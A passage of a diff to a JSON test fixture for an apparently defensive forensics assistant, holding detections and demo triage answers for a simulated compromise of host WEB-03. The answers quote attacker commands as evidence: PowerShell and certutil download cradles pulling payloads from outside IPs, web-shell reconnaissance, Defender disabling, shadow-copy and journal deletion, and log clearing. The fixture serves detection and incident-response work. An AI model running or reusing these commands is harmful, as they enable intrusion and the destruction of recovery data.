+        "provenance": "2026-05-02T09:12:05Z WEB-03 [event 4104]: ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a')"
+      },
+      {
+        "command": "powershell -nop -w hidden -enc SQBFAFgA",
+        "decoded": "",
+        "intent": [],
+        "obfuscated": true,
+        "obfuscation": [
+          "base64-encoded command"
+        ],
+        "stealth_flags": [
+          "hidden window",
+          "no profile"
+        ],
+        "techniques": [
+          "T1027",
+          "T1140"
+        ],
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:12:00Z",
+        "source": "processes.json",
+        "provenance": "2026-05-02T09:12:00Z WEB-03 [processes.json]: powershell -nop -w hidden -enc SQBFAFgA"
+      }
+    ],
+    "lineage": [
+      {
+        "parent": "w3wp.exe",
+        "child": "cmd.exe",
+        "reason": "web server w3wp.exe spawned cmd.exe (web shell)",
+        "techniques": [
+          "T1059.003",
+          "T1505.003"
+        ],
+        "parent_cmdline": "",
+        "child_cmdline": "cmd.exe /c whoami & net user",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:11:30Z",
+        "source": "event 4688",
+        "provenance": "2026-05-02T09:11:30Z WEB-03 [event 4688]: w3wp.exe -> cmd.exe"
+      }
+    ],
+    "antiforensics": [
+      {
+        "technique": "T1070.001",
+        "techniques": [
+          "T1070.001"
+        ],
+        "label": "Security audit log cleared",
+        "command": "",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:40:00Z",
+        "source": "event 1102",
+        "event_id": 1102,
+        "provenance": "2026-05-02T09:40:00Z WEB-03 event 1102: The audit log was cleared"
+      },
+      {
+        "technique": "T1562.001",
+        "techniques": [
+          "T1562.001"
+        ],
+        "label": "Defender tampering (Set-MpPreference -Disable...)",
+        "command": "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:38:00Z",
+        "source": "event 4688",
+        "event_id": 4688,
+        "provenance": "2026-05-02T09:38:00Z WEB-03 [event 4688]: powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true"
+      },
+      {
+        "technique": "T1490",
+        "techniques": [
+          "T1490"
+        ],
+        "label": "VSS shadow-copy deletion",
+        "command": "vssadmin.exe delete shadows /all /quiet",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:38:30Z",
+        "source": "event 4688",
+        "event_id": 4688,
+        "provenance": "2026-05-02T09:38:30Z WEB-03 [event 4688]: vssadmin.exe delete shadows /all /quiet"
+      },
+      {
+        "technique": "T1070",
+        "techniques": [
+          "T1070"
+        ],
+        "label": "USN change-journal deletion",
+        "command": "fsutil usn deletejournal /D C:",
+        "host": "WEB-03",
+        "ts": "2026-05-02T09:39:00Z",
+        "source": "event 4688",
+        "event_id": 4688,
+        "provenance": "2026-05-02T09:39:00Z WEB-03 [event 4688]: fsutil usn deletejournal /D C:"
+      }
+    ],
+    "timestomp": [
+      {
+        "path": "C:\\Windows\\System32\\drivers\\update.sys",
+        "name": "update.sys",
+        "si_created": "2009-07-14T01:14:24Z",
+        "fn_created": "2026-05-02T09:13:00Z",
+        "si_modified": "2009-07-14T01:14:24Z",
+        "fn_modified": "2026-05-02T09:13:00Z",
+        "techniques": [
+          "T1070.006"
+        ],
+        "reasons": [
+          "SI-created (2009-07-14T01:14:24Z) precedes FN-created (2026-05-02T09:13:00Z) \u2014 impossible naturally"
+        ],
+        "host": "WEB-03",
+        "source": "filesystem.json ($MFT SI/FN)",
+        "provenance": "WEB-03 [$MFT]: C:\\Windows\\System32\\drivers\\update.sys \u2014 SI-created (2009-07-14T01:14:24Z) precedes FN-created (2026-05-02T09:13:00Z) \u2014 impossible naturally"
+      }
     ]
   },
   "demo_qa": {
@@ -904,7 +1390,7 @@
           "kill chain"
         ],
         "example": "Map this incident to MITRE ATT&CK.",
-        "text": "Mapped 14 ATT&CK technique(s) across 6 tactic(s): T1059.001 Command and Scripting Interpreter: PowerShell (Execution); T1547.001 Boot or Logon Autostart: Registry Run Keys (Persistence/Privilege Escalation); T1543.003 Create or Modify System Process: Windows Service (Persistence/Privilege Escalation); T1053.005 Scheduled Task/Job: Scheduled Task (Execution/Persistence/Privilege Escalation); T1136.001 Create Account: Local Account (Persistence); T1036.005 Masquerading: Match Legitimate Name or Location (Defense Evasion); T1218.011 System Binary Proxy Execution: Rundll32 (Defense Evasion); T1562.001 Impair Defenses: Disable or Modify Tools (Defense Evasion); T1070.001 Indicator Removal: Clear Windows Event Logs (Defense Evasion); T1071.001 Application Layer Protocol: Web Protocols (Command and Control); T1052.001 Exfiltration Over Physical Medium: USB (Exfiltration); T1546.003 Event Triggered Execution: WMI Event Subscription (Persistence/Privilege Escalation); T1105 Ingress Tool Transfer (Command and Control); T1204.002 User Execution: Malicious File (Execution).",
+        "text": "Mapped 22 ATT&CK technique(s) across 7 tactic(s): T1059.001 Command and Scripting Interpreter: PowerShell (Execution); T1547.001 Boot or Logon Autostart: Registry Run Keys (Persistence/Privilege Escalation); T1543.003 Create or Modify System Process: Windows Service (Persistence/Privilege Escalation); T1053.005 Scheduled Task/Job: Scheduled Task (Execution/Persistence/Privilege Escalation); T1136.001 Create Account: Local Account (Persistence); T1036.005 Masquerading: Match Legitimate Name or Location (Defense Evasion); T1218.011 System Binary Proxy Execution: Rundll32 (Defense Evasion); T1562.001 Impair Defenses: Disable or Modify Tools (Defense Evasion); T1070.001 Indicator Removal: Clear Windows Event Logs (Defense Evasion); T1071.001 Application Layer Protocol: Web Protocols (Command and Control); T1052.001 Exfiltration Over Physical Medium: USB (Exfiltration); T1546.003 Event Triggered Execution: WMI Event Subscription (Persistence/Privilege Escalation); T1105 Ingress Tool Transfer (Command and Control); T1204.002 User Execution: Malicious File (Execution); T1059.003 Command and Scripting Interpreter: Windows Command Shell (Execution); T1505.003 Server Software Component: Web Shell (Persistence); T1140 Deobfuscate/Decode Files or Information (Defense Evasion); T1027 Obfuscated Files or Information (Defense Evasion); T1490 Inhibit System Recovery (Impact); T1070 Indicator Removal (Defense Evasion); T1070.004 Indicator Removal: File Deletion (Defense Evasion); T1070.006 Indicator Removal: Timestomp (Defense Evasion).",
         "tool_calls": [
           {
             "name": "map_attack"
@@ -938,7 +1424,7 @@
           "what spawned"
         ],
         "example": "What spawned the malicious process?",
-        "text": "Process tree (2 creations):\n?\n  \u2514 powershell.exe\n  \u2514 rundll32.exe",
+        "text": "Process tree (8 creations):\n?\n  \u2514 certutil.exe\n  \u2514 powershell.exe\n  \u2514 powershell.exe\n  \u2514 rundll32.exe\n  \u2514 powershell.exe\n  \u2514 vssadmin.exe\n  \u2514 fsutil.exe\nw3wp.exe\n  \u2514 cmd.exe",
         "tool_calls": [
           {
             "name": "process_tree"
@@ -1023,7 +1509,7 @@
           "track"
         ],
         "example": "Did the attacker clear logs or cover their tracks?",
-        "text": "Anti-forensics: yes \u2014 2026-05-02T09:40:00Z (event 1102). Event ID 1102 indicates the Security audit log was cleared.",
+        "text": "Anti-forensics: yes \u2014 Security audit log cleared at 2026-05-02T09:40:00Z (event 1102); Defender tampering (Set-MpPreference -Disable...) at 2026-05-02T09:38:00Z (event 4688); VSS shadow-copy deletion at 2026-05-02T09:38:30Z (event 4688); USN change-journal deletion at 2026-05-02T09:39:00Z (event 4688). Event ID 1102 indicates the Security audit log was cleared. Visibility blind spot: Security audit log cleared at 2026-05-02T09:40:00Z on WEB-03; events before this are unavailable on-host \u2014 recover from forwarded logs / SIEM.",
         "tool_calls": [
           {
             "name": "detect_antiforensics"
@@ -1040,10 +1526,10 @@
           "powershell command"
         ],
         "example": "Show decoded PowerShell scriptblock activity.",
-        "text": "PowerShell activity (3): encoded PowerShell; ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a'); powershell -nop -w hidden -enc SQBFAFgA.",
+        "text": "Command intent (6, 1 decoded): [download_cradle +char-array / join-split reassembly] certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe; [download_cradle, in_memory_exec +base64-encoded command, high-entropy blob (4.1 bits), very long single-line base64] IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1'); [download_cradle, in_memory_exec] ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage.ps1; [obfuscated +base64-encoded command] powershell -nop -w hidden -enc SQBFAFgA; [download_cradle, in_memory_exec] ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a').",
         "tool_calls": [
           {
-            "name": "powershell_activity"
+            "name": "analyze_command_intent"
           }
         ]
       },
@@ -1092,7 +1578,7 @@
           "file timeline"
         ],
         "example": "When were malicious files first written to disk?",
-        "text": "Earliest suspicious file write: C:\\Users\\jdoe\\Downloads\\svchost.exe at 2026-05-02T09:10:05Z. File-system timeline (5): 2026-04-28T14:02:00Z C:\\Users\\jdoe\\Documents\\notes.txt; 2026-05-02T09:10:05Z C:\\Users\\jdoe\\Downloads\\svchost.exe; 2026-05-02T09:11:50Z C:\\Users\\Public\\svchost.exe; 2026-05-02T09:12:50Z C:\\Windows\\Temp\\f.exe; 2026-05-02T09:13:40Z C:\\Users\\Public\\d.dll.",
+        "text": "Earliest suspicious file write: C:\\Users\\jdoe\\Downloads\\svchost.exe at 2026-05-02T09:10:05Z. File-system timeline (7): 2009-07-14T01:14:24Z C:\\Windows\\System32\\drivers\\update.sys; 2026-04-28T14:02:00Z C:\\Users\\jdoe\\Documents\\notes.txt; 2026-05-02T09:10:05Z C:\\Users\\jdoe\\Downloads\\svchost.exe; 2026-05-02T09:11:50Z C:\\Users\\Public\\svchost.exe; 2026-05-02T09:12:50Z C:\\Windows\\Temp\\f.exe; 2026-05-02T09:13:40Z C:\\Users\\Public\\d.dll. Deleted record(s) for suspect file(s): C:\\Users\\Public\\stage2.exe.",
         "tool_calls": [
           {
             "name": "filesystem_timeline"
@@ -1166,7 +1652,7 @@
           "chronolog"
         ],
         "example": "Build a timeline of the compromise.",
-        "text": "Timeline (8 events): 09:12 powershell.exe -> 09:12 evt4104 -> 09:13 evt7045 -> 09:14 rundll32.exe -> 09:16 evt4720 -> 09:18 evt4698 -> 09:25 evt6416 -> 09:40 evt1102.",
+        "text": "Timeline (15 events): 09:10 certutil.exe -> 09:11 powershell.exe -> 09:11 evt4104 -> 09:11 cmd.exe -> 09:12 powershell.exe -> 09:12 evt4104 -> 09:13 evt7045 -> 09:14 rundll32.exe -> 09:16 evt4720 -> 09:18 evt4698 -> 09:25 evt6416 -> 09:38 powershell.exe -> 09:38 vssadmin.exe -> 09:39 fsutil.exe -> 09:40 evt1102.",
         "tool_calls": [
           {
             "name": "timeline"
@@ -1184,7 +1670,7 @@
           "ran"
         ],
         "example": "What suspicious processes executed?",
-        "text": "Matching events (2): 2026-05-02T09:12:00Z powershell.exe powershell -nop -w hidden -enc SQBFAFgA [encoded PowerShell]; 2026-05-02T09:14:00Z rundll32.exe [proxied execution].",
+        "text": "Matching events (8): 2026-05-02T09:10:30Z certutil.exe certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe [certutil URLCache download]; 2026-05-02T09:11:00Z powershell.exe powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA= [encoded PowerShell download cradle]; 2026-05-02T09:11:30Z cmd.exe cmd.exe /c whoami & net user [IIS worker spawned a shell (web shell)]; 2026-05-02T09:12:00Z powershell.exe powershell -nop -w hidden -enc SQBFAFgA [encoded PowerShell]; 2026-05-02T09:14:00Z rundll32.exe rundll32.exe C:\\Users\\Public\\d.dll,Run [proxied execution]; 2026-05-02T09:38:00Z powershell.exe powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true [Defender real-time monitoring disabled].",
         "tool_calls": [
           {
             "name": "search_events"
@@ -1195,7 +1681,7 @@
         "id": "default",
         "keywords": [],
         "example": "Give me a triage summary of this host.",
-        "text": "Persistence: 2 suspicious autorun(s) of 2 total. Notable: Updater -> C:\\Users\\Public\\svchost.exe; ImagePath -> C:\\Windows\\Temp\\f.exe. Matching events (2): 2026-05-02T09:12:00Z powershell.exe powershell -nop -w hidden -enc SQBFAFgA [encoded PowerShell]; 2026-05-02T09:14:00Z rundll32.exe [proxied execution]. Anti-forensics: yes \u2014 2026-05-02T09:40:00Z (event 1102). Event ID 1102 indicates the Security audit log was cleared.",
+        "text": "Persistence: 2 suspicious autorun(s) of 2 total. Notable: Updater -> C:\\Users\\Public\\svchost.exe; ImagePath -> C:\\Windows\\Temp\\f.exe. Matching events (8): 2026-05-02T09:10:30Z certutil.exe certutil.exe -urlcache -split -f http://198.51.100.23/p.exe C:\\Users\\Public\\p.exe [certutil URLCache download]; 2026-05-02T09:11:00Z powershell.exe powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA= [encoded PowerShell download cradle]; 2026-05-02T09:11:30Z cmd.exe cmd.exe /c whoami & net user [IIS worker spawned a shell (web shell)]; 2026-05-02T09:12:00Z powershell.exe powershell -nop -w hidden -enc SQBFAFgA [encoded PowerShell]; 2026-05-02T09:14:00Z rundll32.exe rundll32.exe C:\\Users\\Public\\d.dll,Run [proxied execution]; 2026-05-02T09:38:00Z powershell.exe powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true [Defender real-time monitoring disabled]. Anti-forensics: yes \u2014 Security audit log cleared at 2026-05-02T09:40:00Z (event 1102); Defender tampering (Set-MpPreference -Disable...) at 2026-05-02T09:38:00Z (event 4688); VSS shadow-copy deletion at 2026-05-02T09:38:30Z (event 4688); USN change-journal deletion at 2026-05-02T09:39:00Z (event 4688). Event ID 1102 indicates the Security audit log was cleared. Visibility blind spot: Security audit log cleared at 2026-05-02T09:40:00Z on WEB-03; events before this are unavailable on-host \u2014 recover from forwarded logs / SIEM.",
         "tool_calls": [
           {
             "name": "list_autoruns"
